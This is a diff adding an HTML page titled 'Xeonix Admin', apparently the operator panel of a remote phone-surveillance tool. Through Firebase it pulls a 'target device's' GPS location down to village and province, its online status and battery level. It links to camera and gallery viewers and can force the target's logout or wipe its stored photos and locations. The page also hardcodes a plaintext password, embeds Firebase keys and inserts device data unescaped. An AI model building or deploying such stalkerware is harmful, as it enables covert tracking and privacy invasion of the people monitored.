@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Xeonix Admin</title>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+
+<style>
+body{
+margin:0;
+font-family:Arial, sans-serif;
+background:#f4f6f8;
+color:#222;
+}
+header{
+background:#111;
+color:white;
+padding:15px;
+text-align:center;
+font-weight:bold;
+}
+.container{
+padding:15px;
+}
+.card{
+background:white;
+padding:15px;
+margin-bottom:15px;
+border-radius:8px;
+box-shadow:0 2px 8px rgba(0,0,0,0.05);
+}
+button{
+padding:10px 15px;
+border:none;
+border-radius:6px;
+cursor:pointer;
+margin:5px 0;
+}
+.primary{background:#111;color:white;}
+.danger{background:#e53935;color:white;}
+.info{background:#1976d2;color:white;}
+.success{background:#2e7d32;color:white;}
+
+table{
+width:100%;
+border-collapse:collapse;
+font-size:14px;
+}
+th, td{
+border:1px solid #ddd;
+padding:8px;
+text-align:left;
+}
+th{
+background:#eee;
+}
+
+.loading{color:#1976d2;font-weight:bold;}
+.successText{color:green;font-weight:bold;}
+.errorText{color:red;font-weight:bold;}
+.logout-btn{float:right;}
+</style>
+</head>
+<body>
+
+<header>Xeonix Admin</header>
+
+<div class="container" id="loginBox">
+<div class="card">
+<h3>Login Admin</h3>
+<input type="password" id="pw" placeholder="Enter password" style="width:100%;padding:10px;">
+<button class="primary" onclick="login()">Login</button>
+</div>
+</div>
+
+<div class="container" id="dashboard" style="display:none;">
+
+<div class="card">
+<h3>Status Device 
+<button class="danger logout-btn" onclick="logoutAdmin()">Logout Admin</button>
+</h3>
+<div id="statusText">Checking...</div>
+</div>
+
+<div class="card">
+<h3>Baterai</h3>
+<div id="batteryText">—</div>
+</div>
+
+<div class="card">
+<h3>Kamera</h3>
+<button class="info" onclick="goCam()">Buka Kamera</button>
+<button class="info" onclick="goGallery()">Buka Galeri</button>
+</div>
+
+<!-- CARD REKAMAN GPS (HANYA TOMBOL + STATUS) -->
+<div class="card">
+<h3>Rekaman GPS</h3>
+<button class="primary" onclick="ambilPosisi()">Ambil Posisi</button>
+<div id="gpsStatus"></div>
+</div>
+
+<!-- CARD DATA GPS (TERPISAH) -->
+<div class="card">
+<h3>Data GPS</h3>
+<div id="gpsData">Belum ada data</div>
+</div>
+
+<div class="card">
+<h3>Kontrol Perangkat</h3>
+<button class="danger" onclick="logoutDevice()">Logout Perangkat Target</button>
+</div>
+
+<div class="card">
+<h3>Maintenance</h3>
+<button class="danger" onclick="resetFirebase()">Reset Firebase</button>
+</div>
+
+</div>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyC71owbERIUTdALLUeTILc9KTWYuZ5TNqQ",
+  authDomain: "xeonix-e8b4d.firebaseapp.com",
+  databaseURL: "https://xeonix-e8b4d-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "xeonix-e8b4d",
+  storageBucket: "xeonix-e8b4d.firebasestorage.app",
+  messagingSenderId: "1069914635197",
+  appId: "1:1069914635197:web:69cfb35ca50b05ac5670d4"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+const deviceId="device1";
+
+let waitingGPS=false;
+
+// LOGIN
+function login(){
+if(document.getElementById("pw").value==="xeonix"){
+localStorage.setItem("xeonix_logged","true");
+showDashboard();
+}else{
+alert("Password salah");
+}
+}
+function showDashboard(){
+document.getElementById("loginBox").style.display="none";
+document.getElementById("dashboard").style.display="block";
+}
+function logoutAdmin(){
+localStorage.removeItem("xeonix_logged");
+location.reload();
+}
+if(localStorage.getItem("xeonix_logged")==="true"){
+showDashboard();
+}
+
+// GPS BUTTON
+function ambilPosisi(){
+if(waitingGPS) return;
+
+waitingGPS=true;
+document.getElementById("gpsStatus").innerHTML=
+"<div class='loading'>Mengambil lokasi...</div>";
+
+db.ref("devices/"+deviceId+"/command").set("get_location");
+
+setTimeout(()=>{
+if(waitingGPS){
+document.getElementById("gpsStatus").innerHTML=
+"<div class='errorText'>Gagal mengambil lokasi</div>";
+waitingGPS=false;
+}
+},10000);
+}
+
+// LISTEN GPS UPDATE
+db.ref("devices/"+deviceId+"/gpsHistory").limitToLast(1).on("value",snap=>{
+snap.forEach(child=>{
+let d=child.val();
+
+waitingGPS=false;
+
+document.getElementById("gpsStatus").innerHTML=
+"<div class='successText'>Lokasi berhasil diambil ✔</div>";
+
+document.getElementById("gpsData").innerHTML=`
+<table>
+<tr><th>Latitude</th><td>${d.lat}</td></tr>
+<tr><th>Longitude</th><td>${d.lon}</td></tr>
+<tr><th>Akurasi</th><td>${d.accuracy} m</td></tr>
+<tr><th>Desa</th><td>${d.desa}</td></tr>
+<tr><th>Kecamatan</th><td>${d.kecamatan}</td></tr>
+<tr><th>Kabupaten</th><td>${d.kabupaten}</td></tr>
+<tr><th>Provinsi</th><td>${d.provinsi}</td></tr>
+<tr><th>Waktu</th><td>${new Date(d.time).toLocaleString()}</td></tr>
+</table>
+`;
+});
+});
+
+// ONLINE
+db.ref("devices/"+deviceId+"/online").on("value",snap=>{
+if(snap.val()){
+document.getElementById("statusText").innerHTML="Online";
+document.getElementById("statusText").style.color="green";
+}else{
+document.getElementById("statusText").innerHTML="Offline";
+document.getElementById("statusText").style.color="red";
+}
+});
+
+// BATTERY
+db.ref("devices/"+deviceId+"/battery").on("value",snap=>{
+let b=snap.val();
+if(!b){
+document.getElementById("batteryText").innerHTML="—";
+return;
+}
+document.getElementById("batteryText").innerHTML=
+"🔋 "+b.level+"% "+(b.charging ? " ⚡ Charging" : "");
+});
+
+// DEVICE LOGOUT
+function logoutDevice(){
+if(confirm("Logout perangkat target?")){
+db.ref("devices/"+deviceId+"/command").set("force_logout");
+}
+}
+
+// NAVIGATION
+function goCam(){ window.location.href="cam.html"; }
+function goGallery(){ window.location.href="galeri.html"; }
+
+// RESET FIREBASE 
+function resetFirebase(){
+if(confirm("Reset semua data device? Ini akan menghapus GPS, foto, dan battery.")){
+db.ref("devices/"+deviceId).set({
+online:false
+});
+alert("Firebase berhasil direset");
+}
+}
+
+</script>
+</body>
+</html>
